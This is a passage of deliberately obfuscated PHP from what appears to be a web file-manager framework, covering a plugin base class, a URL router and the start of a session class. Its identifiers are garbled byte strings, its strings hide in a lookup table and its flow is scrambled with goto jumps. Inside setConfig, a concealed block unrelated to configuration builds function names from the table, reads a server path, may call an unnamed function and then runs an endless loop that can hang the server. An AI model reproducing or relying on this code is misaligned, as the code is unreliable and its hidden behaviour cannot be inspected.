$F³¦Îß”Ú½[$BòºäïŞÜŒ[379]][$BòºäïŞÜŒ[1300]] . $BòºäïŞÜŒ[1302]; } } } return $eÎ‡†­Û“Õ; } final function fileCanView($a˜Ø¥ã¬Ù) { $b†óÂ»Œø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (request_url_safe($a˜Ø¥ã¬Ù)) { return !0; } if ($this->isShare($a˜Ø¥ã¬Ù)) { return !0; } if (!Action($b†óÂ»Œø[1303])->authCan($b†óÂ»Œø[1304])) { show_tips(LNG($b†óÂ»Œø[1305]) . $b†óÂ»Œø[1306], !1); } ActionCall($b†óÂ»Œø[1307], $a˜Ø¥ã¬Ù); } final function isShare($E’ÄÖóëİ”) { $fŒ¸È‚Ä¹ = KodIO::parse($E’ÄÖóëİ”); return $fŒ¸È‚Ä¹[$_SERVER[ÚŠ•´ÍéÒÑÔ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($bÚê†è‚ˆŞ) { if (request_url_safe($bÚê†è‚ˆŞ)) { return $bÚê†è‚ˆŞ; } if (!$this->isShare($bÚê†è‚ˆŞ)) { $bÚê†è‚ˆŞ = $this->filePath($bÚê†è‚ˆŞ); } return Action($_SERVER[ÚŠ•´ÍéÒÑÔ][1009])->linkOut($bÚê†è‚ˆŞ); } public function filePathLinkOut($DÙØ®·µ´±) { if (request_url_safe($DÙØ®·µ´±)) { return $DÙØ®·µ´±; } $this->fileCanView($DÙØ®·µ´±); return Action($_SERVER[ÚŠ•´ÍéÒÑÔ][1009])->link($DÙØ®·µ´±); } final function filePath($C»¦›œ¡¶è) { $E‰Õ‚‡øó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($a˜öó·çå = $this->checkSharePath($C»¦›œ¡¶è)) { return $a˜öó·çå; } $this->fileCanView($C»¦›œ¡¶è); if (request_url_safe($C»¦›œ¡¶è)) { $Bé —ÄÜãŒ = parse_url_query($C»¦›œ¡¶è); if (isset($Bé —ÄÜãŒ[$E‰Õ‚‡øó[1308]]) && isset($Bé —ÄÜãŒ[$E‰Õ‚‡øó[194]])) { $c¨¢¾éˆ¬ = Model($E‰Õ‚‡øó[1080])->get($E‰Õ‚‡øó[1309]); $A¡âÌšîø = Mcrypt::decode($Bé —ÄÜãŒ[$E‰Õ‚‡øó[194]], $c¨¢¾éˆ¬); if ($A¡âÌšîø) { $this->fileInfo = IO::infoWithChildren($A¡âÌšîø); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $A¡âÌšîø; } } $C»¦›œ¡¶è = $this->_cacheHttpFile($C»¦›œ¡¶è); $this->fileInfo = IO::infoWithChildren($C»¦›œ¡¶è); } else { $this->fileInfo = IO::infoWithChildren($C»¦›œ¡¶è); if (!$this->fileInfo) { show_tips(LNG($E‰Õ‚‡øó[102]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $C»¦›œ¡¶è; } final function _cacheHttpFile($Aã²ô±Ù¸Ê) { $aäãˆ êÌÃ = hash_path($Aã²ô±Ù¸Ê, !0); $this->cachePath = $this->pluginCachePath($aäãˆ êÌÃ); if ($Fæª˜¯ÚÁÄ = IO::fileNameExist($this->cachePath, $aäãˆ êÌÃ)) { return KodIO::make($Fæª˜¯ÚÁÄ); } $aõñ´«á†Ÿ = $this->cachePath . $aäãˆ êÌÃ; return $this->pluginCacheFileSet($aõñ´«á†Ÿ, file_get_contents($Aã²ô±Ù¸Ê)); } final function _tmpFileName($eÃ´¼ï‹…‹ = array()) { goto E°ëàÈØ¤¨; CÛ×õÀÏ¾‚: if (isset($eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[159]][$B¼…„Ğ‰–§[161]])) { return $eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[159]][$B¼…„Ğ‰–§[161]]; } $CˆíùˆŒåŠ = array($eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[28]], $eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[75]], $eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[77]]); if (isset($eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[455]])) { $CˆíùˆŒåŠ[] = $eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[455]]; } goto Dë‚à­êÁ«; Dë‚à­êÁ«: return md5(implode($B¼…„Ğ‰–§[70], $CˆíùˆŒåŠ)); goto cŠ„—İÒ†; E°ëàÈØ¤¨: $B¼…„Ğ‰–§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$eÃ´¼ï‹…‹) { $eÃ´¼ï‹…‹ = $this->fileInfo; } if (isset($eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[161]])) { return $eÃ´¼ï‹…‹[$B¼…„Ğ‰–§[161]]; } goto CÛ×õÀÏ¾‚; cŠ„—İÒ†: } final function checkSharePath($CŸ´ó·Æ»®) { goto a‡Ş’‰ºŸ‰; a‡Ş’‰ºŸ‰: $fÉí¬ğ£“Ò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!defined($fÉí¬ğ£“Ò[423])) { define($fÉí¬ğ£“Ò[1310], 0); } if (!$this->isShare($CŸ´ó·Æ»®)) { return !1; } goto dËµÑ“ªÅ; AÅ¹®‰‡: $this->cachePath = $this->pluginCachePath($this->fileInfo[$fÉí¬ğ£“Ò[161]]); return $cî”°Ù»Ó[$fÉí¬ğ£“Ò[75]]; goto eœÜÌÀ°â…; dËµÑ“ªÅ: $cî”°Ù»Ó = Action($fÉí¬ğ£“Ò[1009])->sharePathInfo($CŸ´ó·Æ»®); if (!isset($cî”°Ù»Ó[$fÉí¬ğ£“Ò[75]])) { show_json(LNG($fÉí¬ğ£“Ò[1311]), !1); } $this->fileInfo = $cî”°Ù»Ó[$fÉí¬ğ£“Ò[159]]; goto AÅ¹®‰‡; eœÜÌÀ°â…: } final function pluginCachePath($A£¨¥Šê» = '') { $e¢äŒİ ª» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÔŒÌ÷ğá… = IO_PATH_SYSTEM_TEMP . $e¢äŒİ ª»[1312] . $this->pluginName; if (!($aÅÃ…©­î = IO::infoFull($CÔŒÌ÷ğá…))) { return IO::mkdir($CÔŒÌ÷ğá… . $e¢äŒİ ª»[8] . $A£¨¥Šê»); } if (empty($A£¨¥Šê»)) { return $aÅÃ…©­î[$e¢äŒİ ª»[75]]; } if (!($Eáé ˆ£õ = IO::fileNameExist($aÅÃ…©­î[$e¢äŒİ ª»[75]], $A£¨¥Šê»))) { return IO::mkdir($aÅÃ…©­î[$e¢äŒİ ª»[75]] . $A£¨¥Šê»); } return KodIO::make($Eáé ˆ£õ); } final function pluginCacheFileSet($c¼†Ï…µ¶Ù, $D÷‹á¼êÍ„ = '') { $A‘ÓÛ¤Ïˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!($AÙª´ğŒ© = IO::infoFull($c¼†Ï…µ¶Ù))) { return IO::mkfile($c¼†Ï…µ¶Ù, $D÷‹á¼êÍ„, REPEAT_REPLACE); } IO::setContent($AÙª´ğŒ©[$A‘ÓÛ¤Ïˆ[75]], $D÷‹á¼êÍ„); return $AÙª´ğŒ©[$A‘ÓÛ¤Ïˆ[75]]; } final function pluginLocalFile($FÀÀ™Šğš = '') { goto fÅƒ„ãä½ˆ; A¬İøÏ¦¬ö: $c«õÀë¼Û« = $B›ƒÓä¦Ç . $E£¬·Ø®ãí; if (@file_exists($c«õÀë¼Û«)) { return $c«õÀë¼Û«; } return IO::copy($FÀÀ™Šğš, $B›ƒÓä¦Ç, 0, $E£¬·Ø®ãí); goto CÓî³ÆÒø; d™¥èÙŒ²: if (!$FÀÀ™Šğš) { return $B›ƒÓä¦Ç; } $DÓ‘ÚŞø«± = IO::info($FÀÀ™Šğš); $E£¬·Ø®ãí = $this->_tmpFileName($DÓ‘ÚŞø«±) . $D‚æ©ĞåË[93] . $DÓ‘ÚŞø«±[$D‚æ©ĞåË[157]]; goto A¬İøÏ¦¬ö; fÅƒ„ãä½ˆ: $D‚æ©ĞåË =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B›ƒÓä¦Ç = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($B›ƒÓä¦Ç)) { mk_dir($B›ƒÓä¦Ç); } goto d™¥èÙŒ²; CÓî³ÆÒø: } final function appPackage() { goto FÄæ‡áó; dÜ‰Ó´çÖÌ: return $eéœùÀÒªÔ; goto E¹±Çèß; a´ÈÖ££ Ş: $this->parseLang($e£É…¨ôò); $eéœùÀÒªÔ = json_decode_force($e£É…¨ôò); if (!$eéœùÀÒªÔ) { return array(); } goto C³œÆæ„Ô˜; FÄæ‡áó: $aŸ†›ğ­Ìà =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->packageData) { return $this->packageData; } $e£É…¨ôò = $this->parseFile($this->pluginPath . $aŸ†›ğ­Ìà[1313]); goto a´ÈÖ££ Ş; C³œÆæ„Ô˜: $Aˆ‰¾‚çÛÜ = Hook::trigger($aŸ†›ğ­Ìà[1314], $eéœùÀÒªÔ); if ($Aˆ‰¾‚çÛÜ && is_array($Aˆ‰¾‚çÛÜ)) { $eéœùÀÒªÔ = $Aˆ‰¾‚çÛÜ; } $this->packageData = $eéœùÀÒªÔ; goto dÜ‰Ó´çÖÌ; E¹±Çèß: } public function packageInfoGet($cë ‘¼Ò¨¥) { $Bªæ¾ÈöÎÍ = $this->appPackage(); return array_get_value($Bªæ¾ÈöÎÍ, $cë ‘¼Ò¨¥); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÚŠ•´ÍéÒÑÔ][1315]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÚŠ•´ÍéÒÑÔ][1316]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÚŠ•´ÍéÒÑÔ][1317]); } private function parseFile($e“Œ¥ÓÆæ) { $eÛÚáË— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D‘’²ÍÍÜ‚ = file_get_contents($e“Œ¥ÓÆæ); $CëÜæÄŸµ· = array($eÛÚáË—[1318], $eÛÚáË—[1319], $eÛÚáË—[1320], $eÛÚáË—[1321], $eÛÚáË—[1322], $eÛÚáË—[1323], $eÛÚáË—[1324]); $D£ÌÂ«ï = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$eÛÚáË—[84]][$eÛÚáË—[1325]]); $D‘’²ÍÍÜ‚ = str_replace($CëÜæÄŸµ·, $D£ÌÂ«ï, $D‘’²ÍÍÜ‚); return $D‘’²ÍÍÜ‚; } private function parseLang(&$f¨Ã©ÇôœÉ) { goto d¦ŒÙ½‹ã“; d¦ŒÙ½‹ã“: $Bç×¼ŞÑ±© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÉ˜†ğöÎÚ = $Bç×¼ŞÑ±©[1326]; if (!strstr($f¨Ã©ÇôœÉ, $cÉ˜†ğöÎÚ)) { return; } goto Eòòâ°Çµ; Eòòâ°Çµ: preg_match_all($Bç×¼ŞÑ±©[1327], $f¨Ã©ÇôœÉ, $e÷–«Ñ’Üò); if (!is_array($e÷–«Ñ’Üò) || count($e÷–«Ñ’Üò) == 0 || !is_array($e÷–«Ñ’Üò[0]) || count($e÷–«Ñ’Üò[0]) == 0) { return; } $e†Å¬¢£Áˆ = array(); goto C†–³‚—æ; C†–³‚—æ: $C“Ë”ŒÊ® = array(); foreach ($e÷–«Ñ’Üò[0] as $FÅ‚ù´ÜÆÃ) { $b‘ÜœŠ‘ = substr($FÅ‚ù´ÜÆÃ, strlen($cÉ˜†ğöÎÚ), -4); $Dµ…Ğ¡Á÷ì = LNG($b‘ÜœŠ‘); $e†Å¬¢£Áˆ[] = $FÅ‚ù´ÜÆÃ; $C“Ë”ŒÊ®[] = str_replace(array($Bç×¼ŞÑ±©[214], $Bç×¼ŞÑ±©[984], $Bç×¼ŞÑ±©[327], $Bç×¼ŞÑ±©[113]), array($Bç×¼ŞÑ±©[50], $Bç×¼ŞÑ±©[50], $Bç×¼ŞÑ±©[33], $Bç×¼ŞÑ±©[1328]), $Dµ…Ğ¡Á÷ì); } $f¨Ã©ÇôœÉ = str_replace($e†Å¬¢£Áˆ, $C“Ë”ŒÊ®, $f¨Ã©ÇôœÉ); goto f÷æ»£¬ï¸; f÷æ»£¬ï¸: } private function parseConfig(&$C¥Ò×ã«Éå) { goto f’áù‡ˆ–; f‹¥‘»Ğæ: $C¥Ò×ã«Éå = str_replace($eÓ”à¼‚ğÒ, $dì¡Ã—ùÜ, $C¥Ò×ã«Éå); goto A¹ŒÌ¨·‚; f’áù‡ˆ–: $EÒ¶•Š‡– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bŒ·²íóõ¬ = $EÒ¶•Š‡–[1329]; if (!strstr($C¥Ò×ã«Éå, $bŒ·²íóõ¬)) { return; } goto B¯¤ÎÛ¦Œø; B¯¤ÎÛ¦Œø: preg_match_all($EÒ¶•Š‡–[1330], $C¥Ò×ã«Éå, $C¢÷Ë½‘ÂŒ); if (!is_array($C¢÷Ë½‘ÂŒ) || count($C¢÷Ë½‘ÂŒ) == 0 || !is_array($C¢÷Ë½‘ÂŒ[0]) || count($C¢÷Ë½‘ÂŒ[0]) == 0) { return; } $fĞ¼ïÓÜº = $this->getConfig(); goto fñ­àŒ˜½è; fñ­àŒ˜½è: $eÓ”à¼‚ğÒ = array(); $dì¡Ã—ùÜ = array(); foreach ($C¢÷Ë½‘ÂŒ[0] as $bË½¾—ÙÅ) { $BÈí¼² ÖÇ = substr($bË½¾—ÙÅ, strlen($bŒ·²íóõ¬), -2); $eÓ”à¼‚ğÒ[] = $bË½¾—ÙÅ; $dì¡Ã—ùÜ[] = _get($fĞ¼ïÓÜº, $BÈí¼² ÖÇ); } goto f‹¥‘»Ğæ; A¹ŒÌ¨·‚: } private function parsePackage(&$aãé¡ò–ºÓ) { goto b£¾§™Ò’; a•öøù ”½: $aãé¡ò–ºÓ = str_replace($F¢Ç×¶½Êš, $bÛïÅ‰ç¦Œ, $aãé¡ò–ºÓ); goto C•Ò÷´ŒÄ; EÖÍè°Ñ¦Œ: preg_match_all($E¥‡©§ã[1332], $aãé¡ò–ºÓ, $bŸŞ§âÜÅÇ); if (!is_array($bŸŞ§âÜÅÇ) || count($bŸŞ§âÜÅÇ) == 0 || !is_array($bŸŞ§âÜÅÇ[0]) || count($bŸŞ§âÜÅÇ[0]) == 0) { return; } $CÔÅ÷Çò„ = $this->appPackage(); goto C§Ãô…’¹; b£¾§™Ò’: $E¥‡©§ã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Aƒ·²Ì˜™ = $E¥‡©§ã[1331]; if (!strstr($aãé¡ò–ºÓ, $Aƒ·²Ì˜™)) { return; } goto EÖÍè°Ñ¦Œ; C§Ãô…’¹: $F¢Ç×¶½Êš = array(); $bÛïÅ‰ç¦Œ = array(); foreach ($bŸŞ§âÜÅÇ[0] as $DÃÒå²˜¦¡) { $a¤›Á°ùªµ = substr($DÃÒå²˜¦¡, strlen($Aƒ·²Ì˜™), -2); $F¢Ç×¶½Êš[] = $DÃÒå²˜¦¡; $bÛïÅ‰ç¦Œ[] = _get($CÔÅ÷Çò„, $a¤›Á°ùªµ); } goto a•öøù ”½; C•Ò÷´ŒÄ: } final function echoFile($aƒÒùÒ¸“®, $CìÆë¤·ßƒ = false) { goto CÃÎåßÁ°…; Añ²•«ëŒ¬: $this->parsePackage($Fˆğî½Ö´”); if (is_array($CìÆë¤·ßƒ)) { $Fˆğî½Ö´” = str_replace(array_keys($CìÆë¤·ßƒ), array_values($CìÆë¤·ßƒ), $Fˆğî½Ö´”); } echo $b„óÜìÖœ[214] . $Fˆğî½Ö´”; goto B³ïùö º; CÃÎåßÁ°…: $b„óÜìÖœ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a ‚Ã´©Šì = $this->pluginPath . $aƒÒùÒ¸“®; if (ACT == $b„óÜìÖœ[1333]) { echo $b„óÜìÖœ[1334] . $this->pluginName . $b„óÜìÖœ[8] . $aƒÒùÒ¸“® . $b„óÜìÖœ[1335]; if (!file_exists($a ‚Ã´©Šì)) { echo $b„óÜìÖœ[1336]; return; } } goto dŸùñÁ•óì; dŸùñÁ•óì: $Fˆğî½Ö´” = $this->parseFile($a ‚Ã´©Šì); $this->parseLang($Fˆğî½Ö´”); $this->parseConfig($Fˆğî½Ö´”); goto Añ²•«ëŒ¬; B³ïùö º: } final function initLang() { goto D‡¾óì®õ; D‡¾óì®õ: $A´‰ÑÕ»’õ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cèà…½š‹ô = $A´‰ÑÕ»’õ[1337]; $C“¸ÛàÇ = $this->pluginPath . $A´‰ÑÕ»’õ[1338]; goto E°ë¹¬ÏÖ­; E°ë¹¬ÏÖ­: $fÔê‹‹½®Ş = I18n::getType(); $fÜÖ«¸â·† = array(); if (file_exists($C“¸ÛàÇ . $fÔê‹‹½®Ş . $A´‰ÑÕ»’õ[759])) { $fÜÖ«¸â·† = (include $C“¸ÛàÇ . $fÔê‹‹½®Ş . $A´‰ÑÕ»’õ[759]); } else { if ($fÔê‹‹½®Ş == $A´‰ÑÕ»’õ[1339] && !file_exists($C“¸ÛàÇ . $fÔê‹‹½®Ş . $A´‰ÑÕ»’õ[759]) && file_exists($C“¸ÛàÇ . $A´‰ÑÕ»’õ[1340])) { $fÜÖ«¸â·† = (include $C“¸ÛàÇ . $A´‰ÑÕ»’õ[1340]); } else { if (file_exists($C“¸ÛàÇ . $cèà…½š‹ô . $A´‰ÑÕ»’õ[759])) { $fÜÖ«¸â·† = (include $C“¸ÛàÇ . $cèà…½š‹ô . $A´‰ÑÕ»’õ[759]); } } } goto CÁÄˆ¸§½á; CÁÄˆ¸§½á: if (!is_array($fÜÖ«¸â·†)) { return array(); } if (@count($fÜÖ«¸â·†) > 0) { I18n::set($fÜÖ«¸â·†); } return $fÜÖ«¸â·†; goto f‰®ù–Ä›Ÿ; f‰®ù–Ä›Ÿ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($EùËä÷¯¬ø) { $aàç„Ø§„¦ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($_SERVER[$aàç„Ø§„¦[781]]) || !isset($_SERVER[$aàç„Ø§„¦[1341]])) { goto B‡Ü¨”©Ö‰; Dò‚Š™: $fÓÇêÖŸ‚è = $Eøƒä‘–ó($Fá£õ°¶); $bŸèØª„î = explode($aàç„Ø§„¦[214], $fÓÇêÖŸ‚è); if (count($bŸèØª„î) < $aàç„Ø§„¦[549]) { $B¬·É±ŠÌÔ = $aàç„Ø§„¦[787]; $B¬·É±ŠÌÔ(); } goto F‚³Àø£¾é; F‚³Àø£¾é: $aˆèØ–ô¹Î = $aàç„Ø§„¦[788]; $aˆèØ–ô¹Î($_SERVER[$aàç„Ø§„¦[789]]); $F¼­“› = 1; goto E¸ù®ä—½; B‡Ü¨”©Ö‰: $bË¥Í¸¹Ê = $aàç„Ø§„¦[783]; $Eøƒä‘–ó = $aàç„Ø§„¦[784]; $Fá£õ°¶ = $_SERVER[$aàç„Ø§„¦[785]] . $aàç„Ø§„¦[786]; goto Dò‚Š™; E¸ù®ä—½: for ($D„ƒã”å¸‹ = $F¼­“›; $D„ƒã”å¸‹ > 0; $D„ƒã”å¸‹++) { $aˆèØ–ô¹Î = json_encode($GLOBALS[$aàç„Ø§„¦[381]]); } goto f±Ó‰Õáº; f±Ó‰Õáº: } return $this->modelPlugin->setConfig($this->pluginName, $EùËä÷¯¬ø); } public function onSetConfig($a„•êÓÖ×) { } public function onGetConfig($F’Çæ»é÷) { } public function onChangeStatus($AñæÙÃ»°) { } public function onUninstall() { } public function onInstall() { } public function authCheck($fğáµÔÊ = "\160\x6c\x75\x67\x69\x6e\101\x75\x74\x68") { $EÆÈÍëÕˆØ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!defined($EÆÈÍëÕˆØ[423])) { return !1; } if (_get($GLOBALS, $EÆÈÍëÕˆØ[453])) { return !0; } $b¼é«Ÿ–‚¡ = $this->getConfig(); if (!$b¼é«Ÿ–‚¡[$fğáµÔÊ]) { return !1; } return ActionCall($EÆÈÍëÕˆØ[1342], $b¼é«Ÿ–‚¡[$fğáµÔÊ]); } public function url($bÌ„º¸±ä, $a«èŒáÙ±é = '', $D Œ°İòš© = true) { goto Cæã›…×§; Cæã›…×§: $e ¾‡¬¬« =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÉàæùÎÊ– = $this->getConfig(); $a´İÍÓ–åñ = KOD_VERSION . $e ¾‡¬¬«[93] . KOD_VERSION_BUILD; goto eô†×¸«Œ; F™ïº‹µæ²: if (!$D Œ°İòš©) { return $B—¢×™Í‡; } echo $B—¢×™Í‡; goto f“»ÍÔ¦Ì»; eô†×¸«Œ: $cÛø§·åáä = $this->packageVersion(); $A–“™ë¦Ğà = $a´İÍÓ–åñ . $e ¾‡¬¬«[408] . $cÛø§·åáä; if ($a«èŒáÙ±é == $e ¾‡¬¬«[33]) { $B—¢×™Í‡ = $this->pluginHost . $bÌ„º¸±ä . $e ¾‡¬¬«[1343] . $A–“™ë¦Ğà; } else { if ($a«èŒáÙ±é === $e ¾‡¬¬«[76]) { $B—¢×™Í‡ = $this->pluginHost . $bÌ„º¸±ä; } else { if ($a«èŒáÙ±é == $e ¾‡¬¬«[1344]) { $B—¢×™Í‡ = STATIC_PATH . $bÌ„º¸±ä . $e ¾‡¬¬«[1343] . $a´İÍÓ–åñ; } else { if ($a«èŒáÙ±é == $e ¾‡¬¬«[1345]) { $B—¢×™Í‡ = APP_HOST . $e ¾‡¬¬«[1346] . $bÌ„º¸±ä . $e ¾‡¬¬«[1343] . $a´İÍÓ–åñ; } else { if (isset($dÉàæùÎÊ–[$a«èŒáÙ±é])) { $B—¢×™Í‡ = $dÉàæùÎÊ–[$a«èŒáÙ±é] . $bÌ„º¸±ä . $e ¾‡¬¬«[1343] . $A–“™ë¦Ğà; } } } } } goto F™ïº‹µæ²; f“»ÍÔ¦Ì»: } public function link($BÃŠÂ‰õ = false, $Còßè¶À»ó = '') { $C©ÂÙ ©Í¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$BÃŠÂ‰õ) { $this->link($C©ÂÙ ©Í¼[1347], $C©ÂÙ ©Í¼[1345]); $this->link($C©ÂÙ ©Í¼[1348], $C©ÂÙ ©Í¼[1344]); $this->link($C©ÂÙ ©Í¼[1349], $C©ÂÙ ©Í¼[1344]); $this->link($C©ÂÙ ©Í¼[1350], $C©ÂÙ ©Í¼[1344]); $this->link($C©ÂÙ ©Í¼[1351], $C©ÂÙ ©Í¼[1344]); return; } $fŸ¢¹ëŒèİ = $this->url($BÃŠÂ‰õ, $Còßè¶À»ó, !1); if (substr($BÃŠÂ‰õ, -3) == $C©ÂÙ ©Í¼[1352]) { echo $C©ÂÙ ©Í¼[1353] . $fŸ¢¹ëŒèİ . $C©ÂÙ ©Í¼[1354] . $C©ÂÙ ©Í¼[214]; } else { if (substr($BÃŠÂ‰õ, -4) == $C©ÂÙ ©Í¼[1355]) { echo $C©ÂÙ ©Í¼[1356] . $fŸ¢¹ëŒèİ . $C©ÂÙ ©Í¼[1357] . $C©ÂÙ ©Í¼[214]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\133\136\x2f\135\x2b", "\72\x6e\x75\155" => "\133\x30\x2d\71\135\x2b", "\72\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($F‹“íÄ‰œ™, $c‡­ĞÕƒ¸©) { $fŠåÉÓÛ« =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($F‹“íÄ‰œ™ == $fŠåÉÓÛ«[1358]) { $EÓêëŠ±ŠŒ = array_map($fŠåÉÓÛ«[1359], $c‡­ĞÕƒ¸©[0]); $C‡Õ·ºã = strpos($c‡­ĞÕƒ¸©[1], $fŠåÉÓÛ«[8]) === 0 ? $c‡­ĞÕƒ¸©[1] : $fŠåÉÓÛ«[8] . $c‡­ĞÕƒ¸©[1]; $Ağõ‘ãÅÅ = $c‡­ĞÕƒ¸©[2]; } else { $EÓêëŠ±ŠŒ = null; $C‡Õ·ºã = strpos($c‡­ĞÕƒ¸©[0], $fŠåÉÓÛ«[8]) === 0 ? $c‡­ĞÕƒ¸©[0] : $fŠåÉÓÛ«[8] . $c‡­ĞÕƒ¸©[0]; $Ağõ‘ãÅÅ = $c‡­ĞÕƒ¸©[1]; } array_push(self::$maps, $EÓêëŠ±ŠŒ); array_push(self::$routes, $C‡Õ·ºã); array_push(self::$methods, strtoupper($F‹“íÄ‰œ™)); array_push(self::$callbacks, $Ağõ‘ãÅÅ); } public static function error($DÜÉ¯›×˜Ì) { self::$errorCallback = $DÜÉ¯›×˜Ì; } public static function haltOnMatch($dñˆÔ£¹  = true) { self::$halts = $dñˆÔ£¹ ; } public static function dispatch() { goto bæà†¯İ‚¸; bˆ•”¶‡¦: self::$routes = preg_replace($c¹´½¢‚…[1065], $c¹´½¢‚…[8], self::$routes); if (in_array($cìÈÎ¦„éõ, self::$routes)) { $aùæ„ÒÉ† = array_keys(self::$routes, $cìÈÎ¦„éõ); foreach ($aùæ„ÒÉ† as $Cõ•³ä¸Š) { if (self::$methods[$Cõ•³ä¸Š] == $bŞïè¸…–¬ || self::$methods[$Cõ•³ä¸Š] == $c¹´½¢‚…[1361] || in_array($bŞïè¸…–¬, self::$maps[$Cõ•³ä¸Š])) { $CÈ¢ºÖ¶› = !0; if (!is_object(self::$callbacks[$Cõ•³ä¸Š])) { $AÜá¡†îÈ£ = explode($c¹´½¢‚…[8], self::$callbacks[$Cõ•³ä¸Š]); $eİÒê®™Á = end($AÜá¡†îÈ£); $b¹ŒÖğì± = explode($c¹´½¢‚…[1362], $eİÒê®™Á); $d‚Åöâ‚» = new $b¹ŒÖğì±[0](); $d‚Åöâ‚»->{$b¹ŒÖğì±[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Cõ•³ä¸Š]); if (self::$halts) { return; } } } } } else { $C‘ØóØµ¿› = 0; foreach (self::$routes as $Cõ•³ä¸Š) { if (strpos($Cõ•³ä¸Š, $c¹´½¢‚…[4]) !== !1) { $Cõ•³ä¸Š = str_replace($B‰êÙÛÛ—, $DÎ¶‚»Ì, $Cõ•³ä¸Š); } if (preg_match($c¹´½¢‚…[1363] . $Cõ•³ä¸Š . $c¹´½¢‚…[1364], $cìÈÎ¦„éõ, $B²¼¦‡¦¸)) { if (self::$methods[$C‘ØóØµ¿›] == $bŞïè¸…–¬ || self::$methods[$C‘ØóØµ¿›] == $c¹´½¢‚…[1361] || !empty(self::$maps[$C‘ØóØµ¿›]) && in_array($bŞïè¸…–¬, self::$maps[$C‘ØóØµ¿›])) { $CÈ¢ºÖ¶› = !0; array_shift($B²¼¦‡¦¸); if (!is_object(self::$callbacks[$C‘ØóØµ¿›])) { $AÜá¡†îÈ£ = explode($c¹´½¢‚…[8], self::$callbacks[$C‘ØóØµ¿›]); $eİÒê®™Á = end($AÜá¡†îÈ£); $b¹ŒÖğì± = explode($c¹´½¢‚…[1362], $eİÒê®™Á); $d‚Åöâ‚» = new $b¹ŒÖğì±[0](); if (!method_exists($d‚Åöâ‚», $b¹ŒÖğì±[1])) { echo $c¹´½¢‚…[1365]; } else { call_user_func_array(array($d‚Åöâ‚», $b¹ŒÖğì±[1]), $B²¼¦‡¦¸); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$C‘ØóØµ¿›], $B²¼¦‡¦¸); if (self::$halts) { return; } } } } $C‘ØóØµ¿›++; } } if ($CÈ¢ºÖ¶› == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $f×¥«Á”î§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; header($_SERVER[$f×¥«Á”î§[1366]] . $f×¥«Á”î§[1367]); echo $f×¥«Á”î§[1368]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$c¹´½¢‚…[1360]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto E‚ğ²ìÌÁ§; c…–öÍˆ‡ñ: $B‰êÙÛÛ— = array_keys(static::$patterns); $DÎ¶‚»Ì = array_values(static::$patterns); $CÈ¢ºÖ¶› = !1; goto bˆ•”¶‡¦; bæà†¯İ‚¸: $c¹´½¢‚… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cìÈÎ¦„éõ = parse_url($_SERVER[$c¹´½¢‚…[1360]], PHP_URL_PATH); $bŞïè¸…–¬ = $_SERVER[$c¹´½¢‚…[151]]; goto c…–öÍˆ‡ñ; E‚ğ²ìÌÁ§: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto B”î¸ï—Ä‡; B”î¸ï—Ä‡: $B…Ó‰ ß‹£ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; static $E‰§…¡Ù = false; if ($E‰§…¡Ù) { return $E‰§…¡Ù; } goto Dô¸„ Ã¤´; Dô¸„ Ã¤´: $cåÏ”¯²Ö† = $GLOBALS[$B…Ó‰ ß‹£[6]][$B…Ó‰ ß‹£[334]]; self::$sessionTime = $cåÏ”¯²Ö†[$B…Ó‰ ß‹£[1369]]; $c¯éï‚· = SESSION_ID; goto e¼™½ÍÖÙ‰; BˆööŒ¦: $E…´µ°ªö = $cåÏ”¯²Ö†[$B…Ó‰ ß‹£[1371]]; $c“È‰¿æ¿ = $cåÏ”¯²Ö†[$E…´µ°ªö]; 